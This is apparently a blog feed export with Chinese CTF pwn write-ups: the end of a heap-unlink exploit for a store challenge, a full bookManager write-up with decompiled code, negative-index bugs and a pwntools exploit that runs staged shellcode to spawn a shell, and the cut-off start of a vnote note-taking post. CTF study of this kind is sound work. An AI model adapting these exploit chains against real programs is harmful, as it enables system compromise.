class="number">0</span>) <span class="comment">#0 </span></span><br><span class="line">order_cake([<span class="number">1</span>],[<span class="string">'1111'</span>])</span><br><span class="line">exit_order_menu()</span><br><span class="line">logout()</span><br><span class="line">login(<span class="string">'bbbb'</span>,<span class="string">'bbbb'</span>,<span class="string">'bbbb'</span>,reg=<span class="number">1</span>)</span><br><span class="line">login()</span><br><span class="line">order_menu()</span><br><span class="line">add_to_list(<span class="number">1</span>) <span class="comment">#0</span></span><br><span class="line">add_to_list(<span class="number">2</span>) <span class="comment">#1</span></span><br><span class="line">cancel_list(<span class="number">0</span>)</span><br><span class="line">exit_order_menu()</span><br><span class="line"><span class="comment"># delete account 'aaaa' -&gt; unsorted bins</span></span><br><span class="line">account_menu()</span><br><span class="line">delete_accont(<span class="number">2</span>)</span><br><span class="line">exit_account_menu()</span><br><span class="line"><span class="comment"># leak libc address</span></span><br><span class="line">order_menu()</span><br><span class="line">user2_data = <span class="number">0x604210</span></span><br><span class="line">order_cake([<span class="number">0</span>],[p64(user2_data<span class="number">-0x18</span>)+p64(user2_data<span class="number">-0x10</span>)])</span><br><span class="line">add_to_list(<span class="number">1</span>) <span class="comment">#0</span></span><br><span class="line">add_to_list(<span class="number">2</span>) <span class="comment">#2</span></span><br><span class="line">exit_order_menu()</span><br><span class="line">account_menu()</span><br><span class="line">delete_accont(<span class="number">3</span>)</span><br><span class="line">exit_account_menu()</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">8</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">buy_cake(<span class="number">0</span>,<span class="number">10</span>,payload)</span><br><span class="line">order_menu()</span><br><span class="line">add_to_list(<span class="number">3</span>)</span><br><span class="line">libc.address = (u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4b20</span>) &amp; <span class="number">0xfffffffff000</span> </span><br><span class="line">add_to_list(<span class="number">4</span>) <span class="comment">#3</span></span><br><span class="line">add_to_list(<span class="number">5</span>) <span class="comment">#4</span></span><br><span class="line">add_to_list(<span class="number">6</span>) <span class="comment">#5</span></span><br><span class="line">add_to_list(<span class="number">7</span>) <span class="comment">#6</span></span><br><span class="line">add_to_list(<span class="number">8</span>) <span class="comment">#7</span></span><br><span class="line">add_to_list(<span class="number">9</span>) <span class="comment">#8</span></span><br><span class="line">exit_order_menu()</span><br><span class="line">account_menu()</span><br><span class="line"></span><br><span class="line">change_password(<span class="number">3</span>,p64(<span class="number">0x581</span>)) <span class="comment"># overwite list[0] chunk size</span></span><br><span class="line">exit_account_menu()</span><br><span class="line">order_menu()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>,<span class="number">3</span>,<span class="number">-1</span>):</span><br><span class="line">    cancel_list(i)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">14</span>+p64(<span class="number">0x1f0</span>)+p32(<span class="number">0x90</span>)</span><br><span class="line">order_cake([<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],[payload,<span class="string">'1'</span>,<span class="string">'1'</span>])</span><br><span class="line">exit_order_menu()</span><br><span class="line">account_menu()</span><br><span class="line">change_password(<span class="number">2</span>,p64(elf.got[<span class="string">'strlen'</span>]<span class="number">-0x18</span>))</span><br><span class="line">change_password(<span class="number">2</span>,p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">exit_account_menu()</span><br><span class="line">logout()</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="解题方法二"><a href="#解题方法二" class="headerlink" title="解题方法二"></a>解题方法二</h4><p>泄露地址方法给上面一样，不过这次还需要泄露heap地址，可以通过泄露<code>fastbins</code>的<code>fd</code>地址计算。上面提到UAF修改<code>chunk size</code>比较麻烦，不过可以修改<code>smallbins</code>的<code>bk</code>。过程很复杂，不想写了，具体过程动态调试看吧。</p><p>思路是控制<code>smallbins</code>的<code>bk</code>，指向构造的两个假<code>smallbins</code>，假的<code>smallbins</code>内存空间与其他已使用的<code>chunk</code>重叠，可以修改其他<code>chunk head</code>制造触发<code>unlink</code>的条件。</p><p>完整EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">login()</span><br><span class="line">order_menu()</span><br><span class="line">add_to_list(<span class="number">0</span>)</span><br><span class="line">add_to_list(<span class="number">1</span>)</span><br><span class="line">order_cake([<span class="number">0</span>,<span class="number">0</span>],[<span class="string">'AAAA'</span>,<span class="string">'BBBB'</span>]) <span class="comment"># 0 1</span></span><br><span class="line">exit_order_menu()</span><br><span class="line"></span><br><span class="line">buy_cake(<span class="number">0</span>,<span class="number">10</span>,<span class="string">'CCCC'</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">order_menu()</span><br><span class="line">add_to_list(<span class="number">0</span>) </span><br><span class="line">libc.address = (u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4b20</span>) &amp; <span class="number">0xfffffffff000</span> </span><br><span class="line">add_to_list(<span class="number">0</span>)</span><br><span class="line">add_to_list(<span class="number">2</span>)</span><br><span class="line">order_cake([<span class="number">0</span>,<span class="number">0</span>],[<span class="string">'DDDD'</span>,<span class="string">'EEEE'</span>]) <span class="comment"># 2 3</span></span><br><span class="line">add_to_list(<span class="number">3</span>)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">0x48</span>)[<span class="number">0x23</span>:<span class="number">0x23</span>+<span class="number">4</span>].strip().ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">order_cake([<span class="number">0</span>],[<span class="string">'FFFF'</span>]) <span class="comment"># 4</span></span><br><span class="line">add_to_list(<span class="number">4</span>)</span><br><span class="line">exit_order_menu()</span><br><span class="line">logout()</span><br><span class="line"></span><br><span class="line">login(<span class="string">'aaaa'</span>,<span class="string">'aaaa'</span>,<span class="string">'aaaa'</span>,reg=<span class="number">1</span>) <span class="comment"># user2</span></span><br><span class="line">login(<span class="string">'bbbb'</span>,<span class="string">'bbbb'</span>,<span class="string">'bbbb'</span>,reg=<span class="number">1</span>) <span class="comment"># user3</span></span><br><span class="line"></span><br><span class="line">login()</span><br><span class="line">buy_cake(<span class="number">0</span>,<span class="number">10</span>,<span class="string">'GGGG'</span>) <span class="comment"># 2 3 4</span></span><br><span class="line"></span><br><span class="line">account_menu()</span><br><span class="line">delete_accont(<span class="number">2</span>)</span><br><span class="line">exit_account_menu()</span><br><span class="line"></span><br><span class="line">order_menu()</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">48</span>+flat(<span class="number">0</span>,<span class="number">0x91</span>,heap_addr+<span class="number">0xe50</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x91</span>,heap_addr+<span class="number">0xdf0</span>,heap_addr+<span class="number">0xe30</span>)</span><br><span class="line">order_cake([<span class="number">0</span>],[payload]) <span class="comment"># 5</span></span><br><span class="line">exit_order_menu()</span><br><span class="line"></span><br><span class="line">buy_cake(<span class="number">3</span>,<span class="number">10</span>,<span class="string">'HHHH'</span>) <span class="comment"># 1 2 4 5</span></span><br><span class="line"></span><br><span class="line">account_menu()</span><br><span class="line">change_password(<span class="number">2</span>,p64(heap_addr+<span class="number">0xe50</span>)) <span class="comment"># overwrite bk</span></span><br><span class="line">exit_account_menu()</span><br><span class="line"></span><br><span class="line">order_menu()</span><br><span class="line">add_to_list(<span class="number">5</span>)</span><br><span class="line">user2_data = <span class="number">0x604210</span></span><br><span class="line">order_cake([<span class="number">0</span>],[p64(user2_data<span class="number">-0x18</span>)+p64(user2_data<span class="number">-0x10</span>)])</span><br><span class="line">exit_order_menu()</span><br><span class="line"></span><br><span class="line">buy_cake(<span class="number">0</span>,<span class="number">20</span>,<span class="string">'IIII'</span>)</span><br><span class="line"></span><br><span class="line">account_menu()</span><br><span class="line">change_password(<span class="number">2</span>,p64(user2_data<span class="number">-0x10</span>)) <span class="comment"># fix bk</span></span><br><span class="line">exit_account_menu()</span><br><span class="line"></span><br><span class="line">order_menu()</span><br><span class="line">add_to_list(<span class="number">6</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x20</span> + p64(<span class="number">0x90</span>) + p64(<span class="number">0x90</span>) <span class="comment"># 5e0</span></span><br><span class="line">order_cake([<span class="number">0</span>],[payload])</span><br><span class="line">exit_order_menu()</span><br><span class="line"></span><br><span class="line">account_menu()</span><br><span class="line">delete_accont(<span class="number">3</span>) <span class="comment"># unlink</span></span><br><span class="line">change_password(<span class="number">2</span>,p64(elf.got[<span class="string">'atoi'</span>]<span class="number">-0x18</span>))</span><br><span class="line">change_password(<span class="number">2</span>,p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">p.send(<span class="string">'sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>第一次分析pwn的题流量，真难受死了，只有输入的流量，没有回显。果然pwn手都比较单纯，没有混淆流量，不像web，一大堆wangyihang的fake requests[捂脸]。web题估计没时间复现了，搞这题store用了我好几张A4纸，真是累死了。。。。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上个月在护网杯打了个酱油，第一次打某宁的线下赛，风格跟某春秋差别还是挺大的，没什么端口限制，提flag接口也很友好，属于最开放的网络环境了，
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>护网杯线下赛积分赛bookManager</title>
    <link href="https://4f-kira.github.io/2018/10/29/huwangbei-bookmanager/"/>
    <id>https://4f-kira.github.io/2018/10/29/huwangbei-bookmanager/</id>
    <published>2018-10-29T07:50:59.000Z</published>
    <updated>2018-10-29T08:08:35.500Z</updated>
    
    <content type="html"><![CDATA[<p>护网杯线下赛第一场是ctf积分赛，秒做pwn签到题之后一直无所事事，这道bookManager当时也没能做出来，趁着中午午休的时候，把这条题重新做做。</p><h2 id="bookManager"><a href="#bookManager" class="headerlink" title="bookManager"></a>bookManager</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/pwn/huwangbei/task_bookManager&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = <span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">  init_(v3);  <span class="comment">// 初始化</span></span><br><span class="line">  v6 = v3;</span><br><span class="line">  qword_202088 = v3 + <span class="number">12</span>;  <span class="comment">// 出题人故意留的指针</span></span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)menu() != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      (*(<span class="keyword">void</span> (__fastcall **)(__int64))(*(_QWORD *)v6 + <span class="number">8L</span>L))(v6);<span class="comment">// func[2] == show</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v5 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        (*(<span class="keyword">void</span> (__fastcall **)(__int64))(*(_QWORD *)v6 + <span class="number">16L</span>L))(v6);<span class="comment">// func[1] == edit</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v5 == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      (**(<span class="keyword">void</span> (__fastcall ***)(__int64))v6)(v6);<span class="comment">// func[0] == add</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序提供了三种功能，分别是<code>add,edit,show</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__<span class="function">fastcall <span class="title">sub_B10</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *(_QWORD *)a1 = off_201DC0;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memset</span>((<span class="keyword">void</span> *)(a1 + <span class="number">12</span>), <span class="number">0</span>, <span class="number">0xF0</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序初始化时，新建了一个对象，其中<code>off_201DC0</code>存放了三个基本功能的函数地址，大概结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">func[3]         8byte</span><br><span class="line">book_count      4byte</span><br><span class="line">book1conent     8byte</span><br><span class="line">book1index      4byte</span><br><span class="line">book2conent     8byte</span><br><span class="line">book2index      4byte</span><br><span class="line">        ....</span><br></pre></td></tr></table></figure><p>漏洞点一：<code>show</code>的函数可以输入负数，如果输入<code>-1</code>就可以把<code>func[3]</code>的地址泄露出来，从而计算出ELF基址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">show</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Which book do you want to show?"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"book name is:%s\n"</span>, a1 + <span class="number">12L</span>L * v2 + <span class="number">12</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞点二：<code>eidt</code>的函数同样可以输入负数，如果输入<code>-1</code>就可以修改对象存放的函数地址，考虑到程序没开<code>NX</code>，本题可以使用shellcode来getshell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">edit</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  __int16 v4; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"change Book id:"</span>);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"new Name:"</span>);</span><br><span class="line">  buf = <span class="number">0L</span>L;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0xA</span>uLL);</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">12L</span>L * v2 + <span class="number">12</span>) = buf;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可控的输入字段是book的content，问题是如何泄露heap地址，比赛的时候一直没想到方法。直到剩最后半小时，才发现出题人在程序里故意留了一个可用的指针<code>qword_202088</code>，果然这些蜜汁变量都是有用的！</p><p>这个地址就是直接指向<code>book1conent</code>开始的地方，如果把对象存放的函数地址修改为这个地址，那么输入<code>1</code>之后（func[0]），就能运行heap中的shellcode，注意每组<code>content</code>只有8字节长度，中间有4字节是存放<code>index</code>。</p><p>由于分段太多，除去跳转的<code>jmp short 4</code>，只剩6字节一组，那就先用<code>read(0,&amp;buf,0xff)</code>来扩大输入，然后再写入getshell的shellcode。</p><p>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice:\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'BookName:'</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice:\n'</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'id:'</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'Name:'</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice:\n'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'show?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line">show(<span class="number">-1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name is:'</span>)</span><br><span class="line">func_addr = u64(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'func_addr:&#123;:#x&#125;'</span>.format(func_addr))</span><br><span class="line">elf_address = func_addr - <span class="number">0x201dc0</span></span><br><span class="line">success(<span class="string">'elf_address:&#123;:#x&#125;'</span>.format(elf_address))</span><br><span class="line">shellcode_addr = elf_address + <span class="number">0x202088</span></span><br><span class="line"><span class="comment"># read(0,&amp;buf,0xff)</span></span><br><span class="line">jmp_4 = <span class="string">'\xeb\x04'</span></span><br><span class="line">shellcode1 = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">                mov rsi, rax</span></span><br><span class="line"><span class="string">                xor rdi, rdi</span></span><br><span class="line"><span class="string">                '''</span>)</span><br><span class="line">add(shellcode1.ljust(<span class="number">6</span>,<span class="string">'\x90'</span>)+jmp_4)</span><br><span class="line"></span><br><span class="line">shellcode2 = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">                xor rax, rax</span></span><br><span class="line"><span class="string">                '''</span>)</span><br><span class="line">add(shellcode2.ljust(<span class="number">6</span>,<span class="string">'\x90'</span>)+jmp_4)</span><br><span class="line"></span><br><span class="line">shellcode3 = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">                mov edx,0xff</span></span><br><span class="line"><span class="string">                '''</span>)</span><br><span class="line">add(shellcode3.ljust(<span class="number">6</span>,<span class="string">'\x90'</span>)+jmp_4)</span><br><span class="line"></span><br><span class="line">shellcode4 = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">                syscall</span></span><br><span class="line"><span class="string">                '''</span>)</span><br><span class="line">add(shellcode4)</span><br><span class="line"><span class="comment"># overwrite *func[3]</span></span><br><span class="line">edit(<span class="number">-1</span>,p64(shellcode_addr))</span><br><span class="line">p.sendlineafter(<span class="string">'choice:\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.send(<span class="string">'\x90'</span>*<span class="number">48</span>+asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>注意<code>rdx</code>的不能太大，不然<code>read</code>没反应。总结一下，平时手写shellcode太少了，最后半小时手忙脚乱，没把exp写出来（虽然做出来也没什么卵用）。还有几题难道有点大，之后随缘做吧，有时间先把AWD的pwn重新做一下~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;护网杯线下赛第一场是ctf积分赛，秒做pwn签到题之后一直无所事事，这道bookManager当时也没能做出来，趁着中午午休的时候，把这条题重新做做。&lt;/p&gt;
&lt;h2 id=&quot;bookManager&quot;&gt;&lt;a href=&quot;#bookManager&quot; class=&quot;header
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>vnote+企鹅云打造你的个人笔记</title>
    <link href="https://4f-kira.github.io/2018/10/20/vnote/"/>
    <id>https://4f-kira.github.io/2018/10/20/vnote/</id>
    <published>2018-10-20T14:25:26.000Z</published>
    <updated>2018-10-20T14:26:54.215Z</updated>
    
    <content type="html"><![CDATA[<p>之前一直用有道云做笔记，然而有道云的功能实在太垃圾了，唯一值得称赞的就只有免费空间大和同步速度快了，不支持代码高亮，搜索功能垃圾得无法忍受，找笔记全靠大脑模糊索引。是时候淘汰这种垃圾软件了！！！</p><p>自从学习了用markdown做笔记之后，就一发不可收拾了，有道云也改用了markdown来做笔记，有道云的markdown功能其实也是能接受的，然而根本没办法搜索内容。当然也有<code>Typora</code>这些写markdown的神器，然而做笔记还要考虑多台电脑数据的同步问题，<code>Typora</code>用来写markdown还可以，做笔记就有点不方便。</p><h2 id="vnote"><a href="#vnote" class="headerlink" title="vnote"></a>vnote</h2><p>项目地址：<a href="https://github.com/tamlok/vnote" target="_blank" rel="noopener">https://github.com/tamlok/vnote</a></p><p>著名划水网站<code>V2EX</code>网友开发的一款笔记工具，功能非常强劲，能满足强迫症患者使用markdown的一切需求（不是我），作者试这么说这款软件的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VNote的设计理念就是： 采用精心设计的语法高亮，以及一些辅助手段，在不牺牲文本细节的前提下，最大限度地减小Markdown编辑和阅读之间的割裂感。</span><br></pre></td></tr></table></figure><p><strong>程序界面</strong></p><p><img src="http://ww1.sinaimg.cn/large/6701be31gy1fwf15exr2kj20zl0kh0uu.jpg" alt=""></p><p>在GitHub下载绿色版解压即用，十分方便。</p><h2 id="企鹅云"><a href="#企鹅云" class="headerlink" title="企鹅云"></a>企鹅云</h2><p>为了解决笔记同步和备份问题，直接用<code>git</code>解决好了，vnote做笔记就是一堆的文件，直接同步到远程代码仓库就OXXK了。为何要用企鹅云，主要考虑<code>Github</code>没有免费私密仓（<del>总有羞羞的笔记不能公开嘛</del>），而且有时速度感人。自己搭个<code>gitlab</code>，容易会炸，还要运维太麻烦了。</p><p>官网地址：<a href="https://dev.tencent.com/" target="_blank" rel="noopener">https://dev.tencent.com/</a></p><p>注册后私密仓数量不受限制，仓库容量也是不限制的，国内同步速度也很快。</p><h2 id="部署方式"><a href="#部署方式" 